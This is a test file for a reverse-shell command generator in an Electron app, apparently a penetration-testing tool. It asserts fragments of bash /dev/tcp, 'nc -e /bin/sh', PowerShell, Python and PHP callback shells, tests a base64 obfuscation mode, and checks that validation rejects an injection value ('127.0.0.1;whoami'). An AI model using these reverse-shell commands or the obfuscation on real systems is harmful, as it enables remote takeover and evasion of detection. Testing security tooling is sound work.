// @vitest-environment node
import { describe, expect, it } from 'vitest';
import { buildShellConnectCommand, listShellConnectTemplates } from '@electron/services/shell-connect-builder';

describe('Shell Connect Builder', () => {
  it('exposes the bounded built-in template catalog', () => {
    expect(listShellConnectTemplates().map((template) => template.id)).toEqual([
      'powershell-tcp',
      'bash-tcp',
      'python3',
      'netcat',
      'busybox-netcat',
      'php-cli',
    ]);
    expect(listShellConnectTemplates().every((template) => template.runtime && template.note)).toBe(true);
  });

  it.each([
    ['powershell-tcp', "TCPClient('127.0.0.1',4444)"],
    ['bash-tcp', '/dev/tcp/127.0.0.1/4444'],
    ['python3', 's.connect(("127.0.0.1",4444))'],
    ['netcat', 'nc 127.0.0.1 4444 -e /bin/sh'],
    ['busybox-netcat', 'busybox nc 127.0.0.1 4444 -e /bin/sh'],
    ['php-cli', 'fsockopen("127.0.0.1",4444)'],
  ] as const)('builds deterministic %s local-test output (no obfuscation)', (templateId, expected) => {
    const result = buildShellConnectCommand({
      projectId: 'project-1',
      listenerId: 'listener-1',
      templateId,
      callbackAddress: '127.0.0.1',
      callbackPort: 4444,
    });
    expect(result.command).toContain(expected);
    expect(result).toMatchObject({ localOnly: true, callbackAddress: '127.0.0.1', callbackPort: 4444, obfuscation: 'none' });
  });

  it('marks non-loopback addresses as localOnly: false', () => {
    const result = buildShellConnectCommand({
      projectId: 'project-1',
      listenerId: 'listener-1',
      templateId: 'bash-tcp',
      callbackAddress: '192.168.1.10',
      callbackPort: 4444,
    });
    expect(result.localOnly).toBe(false);
    expect(result.command).toContain('/dev/tcp/192.168.1.10/4444');
  });

  it('produces base64-obfuscated commands for every template', () => {
    for (const templateId of ['powershell-tcp', 'bash-tcp', 'python3', 'netcat', 'busybox-netcat', 'php-cli'] as const) {
      const result = buildShellConnectCommand({
        projectId: 'project-1',
        listenerId: 'listener-1',
        templateId,
        callbackAddress: '127.0.0.1',
        callbackPort: 4444,
        obfuscation: 'base64',
      });
      expect(result.obfuscation).toBe('base64');
      // Must not contain the plain address literal
      expect(result.command).not.toContain('127.0.0.1');
      // Must not contain the plain port literal (avoid false positive in base64)
      expect(result.command).not.toMatch(/(?<![A-Za-z0-9+/=])4444(?![A-Za-z0-9+/=])/);
    }
  });

  it('base64 round-trip: bash-tcp decodes to the original plaintext', () => {
    const plain = buildShellConnectCommand({
      projectId: 'project-1', listenerId: 'listener-1', templateId: 'bash-tcp',
      callbackAddress: '10.0.0.1', callbackPort: 9999, obfuscation: 'none',
    });
    const obfuscated = buildShellConnectCommand({
      projectId: 'project-1', listenerId: 'listener-1', templateId: 'bash-tcp',
      callbackAddress: '10.0.0.1', callbackPort: 9999, obfuscation: 'base64',
    });
    // Extract the base64 payload and decode it
    const match = obfuscated.command.match(/echo ([A-Za-z0-9+/=]+)\|base64/);
    expect(match).toBeTruthy();
    const decoded = Buffer.from(match![1], 'base64').toString('utf8');
    const plainPayload = plain.command.slice("bash -c '".length).replace(/'$/, '');
    expect(decoded).toBe(plainPayload);
  });

  it('accepts any valid unicast IPv4 address', () => {
    for (const callbackAddress of ['192.168.1.10', '10.0.0.1', '172.16.0.1', '127.0.0.1', '127.255.255.255']) {
      const result = buildShellConnectCommand({
        projectId: 'project-1', listenerId: 'listener-1', templateId: 'bash-tcp',
        callbackAddress, callbackPort: 4444,
      });
      expect(result.callbackAddress).toBe(callbackAddress);
    }
  });

  it('rejects wildcard, broadcast, multicast, malformed, and shell-shaped callback addresses', () => {
    for (const callbackAddress of ['0.0.0.0', '255.255.255.255', '224.0.0.1', 'localhost', '127.0.0.1;whoami', 'https://127.0.0.1', '::1']) {
      expect(() => buildShellConnectCommand({
        projectId: 'project-1', listenerId: 'listener-1', templateId: 'bash-tcp',
        callbackAddress, callbackPort: 4444,
      })).toThrow();
    }
  });

  it('rejects unknown templates, invalid identifiers, and invalid ports', () => {
    expect(() => buildShellConnectCommand({
      projectId: 'project-1', listenerId: 'listener-1',
      templateId: 'unknown' as 'bash-tcp', callbackAddress: '127.0.0.1', callbackPort: 4444,
    })).toThrow('Unknown Shell connection template');
    expect(() => buildShellConnectCommand({
      projectId: '../project', listenerId: 'listener-1',
      templateId: 'bash-tcp', callbackAddress: '127.0.0.1', callbackPort: 4444,
    })).toThrow('Invalid project identifier');
    expect(() => buildShellConnectCommand({
      projectId: 'project-1', listenerId: 'listener-1',
      templateId: 'bash-tcp', callbackAddress: '127.0.0.1', callbackPort: 0,
    })).toThrow('Callback port');
  });
});
